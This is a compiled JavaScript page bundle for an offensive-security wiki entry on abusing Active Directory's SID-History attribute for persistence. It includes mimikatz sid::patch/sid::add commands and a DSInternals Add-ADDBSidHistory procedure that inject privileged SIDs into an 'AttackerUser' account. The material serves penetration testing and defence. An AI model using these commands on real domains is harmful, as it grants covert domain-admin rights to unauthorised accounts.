import{_ as i,c as a,a5 as e,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"SID History","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/persistence/sid-history.md","filePath":"ad/persistence/sid-history.md","lastUpdated":1724982529000}'),n={name:"ad/persistence/sid-history.md"};function r(o,s,h,l,p,d){return t(),a("div",null,s[0]||(s[0]=[e(`<h1 id="sid-history" tabindex="-1">SID History <a class="header-anchor" href="#sid-history" aria-label="Permalink to &quot;SID History&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.</p><p>The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.</p><p>This mechanism can also be abused as a means of persistence: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added.</p><p>For instance, the SID of an account with Domain Admin rights can be added to a normal user SID History to grant them Domain Admin rights (the rights would not be granted per say, but the modified account would be treated as domain admin when checking rights).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="caution custom-block"><p>There is currently no way to exploit this technique purely from a distant UNIX-like machine, as it requires some operations on specific Windows processes&#39; memory.</p></div><h3 id="pre-windows-2016" tabindex="-1">Pre-Windows 2016 <a class="header-anchor" href="#pre-windows-2016" aria-label="Permalink to &quot;Pre-Windows 2016&quot;">​</a></h3><p>Modifying the SID History attribute of an object can be done using mimikatz, with the <a href="https://tools.thehacker.recipes/mimikatz/modules/sid/patch" target="_blank" rel="noreferrer"><code>sid::patch</code></a>, <a href="https://tools.thehacker.recipes/mimikatz/modules/sid/add" target="_blank" rel="noreferrer"><code>sid::add</code></a> and <a href="https://tools.thehacker.recipes/mimikatz/modules/sid/lookup" target="_blank" rel="noreferrer"><code>sid::lookup</code></a> commands.</p><p>Mimikatz cannot be used on 2016+ domain controllers for that purpose, due to an error with <a href="https://tools.thehacker.recipes/mimikatz/modules/sid/patch" target="_blank" rel="noreferrer"><code>sid::patch</code></a> (<a href="https://github.com/gentilkiwi/mimikatz/issues/348" target="_blank" rel="noreferrer">https://github.com/gentilkiwi/mimikatz/issues/348</a>)</p><div class="warning custom-block"><p>Mimikatz must be launched with at least enough privileges to perform the <a href="https://tools.thehacker.recipes/mimikatz/modules/privilege/debug" target="_blank" rel="noreferrer"><code>privilege::debug</code></a> command (i.e. domain admin or <code>SYSTEM</code>).</p></div><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Generic command</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">mikikatz.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;privilege::debug&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::patch&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::add /sam:UserRecievingTheSID /new:SIDOfTheTargetedUserOrGroup&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Example 1 : Use this command to inject the SID of built-in administrator account to the SID-History attribute of AttackerUser</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">mikikatz.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;privilege::debug&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::patch&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::add /sam:AttackerUser /new:Builtin\\administrators &quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Example 2 : Use sid::lookup to retrieve the SID of an account and inject it to the SID-History attribute of AttackerUser</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">mikikatz.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::lookup /name:InterestingUser&quot;</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">mikikatz.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;privilege::debug&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::patch&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sid::add /sam:AttackerUser /new:SIDOfInterestingUser&quot;</span></span></code></pre></div><h3 id="post-windows-2016" tabindex="-1">Post-Windows 2016 <a class="header-anchor" href="#post-windows-2016" aria-label="Permalink to &quot;Post-Windows 2016&quot;">​</a></h3><p>The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module <a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank" rel="noreferrer">DSInternals</a>. This method also works for Pre-Windows 2016 domain controllers.</p><div class="caution custom-block"><p>The NTDS service must be stopped at some point and restarted for this procedure to work, which can cause various issues. Proceed with care, avoid production systems.</p></div><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Install DSInternals on the domain controller</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Install-Module</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Name DSInternals</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Find the account SID you want to inject</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Get-ADUser</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Identity $InterestingUser</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Stop the NTDS service</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Stop-service</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> NTDS </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">force</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Inject the SID into the SID History attribute</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Add-ADDBSidHistory</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">samaccountname AttackerUser </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sidhistory $SIDOfInterestingUser </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">DBPath C:\\Windows\\ntds\\ntds.dit</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Start the NTDS service</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Start-service</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> NTDS</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory</a></p><p><a href="https://attack.mitre.org/techniques/T1134/005/" target="_blank" rel="noreferrer">https://attack.mitre.org/techniques/T1134/005/</a></p><p><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noreferrer">https://adsecurity.org/?p=1772</a></p><p><a href="https://forum.winbatch.com/index.php?topic=1545.0" target="_blank" rel="noreferrer">https://forum.winbatch.com/index.php?topic=1545.0</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory#operational-constraints" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory#operational-constraints</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya</a></p><p><a href="https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/" target="_blank" rel="noreferrer">https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/</a></p>`,25)]))}const u=i(n,[["render",r]]);export{k as __pageData,u as default};
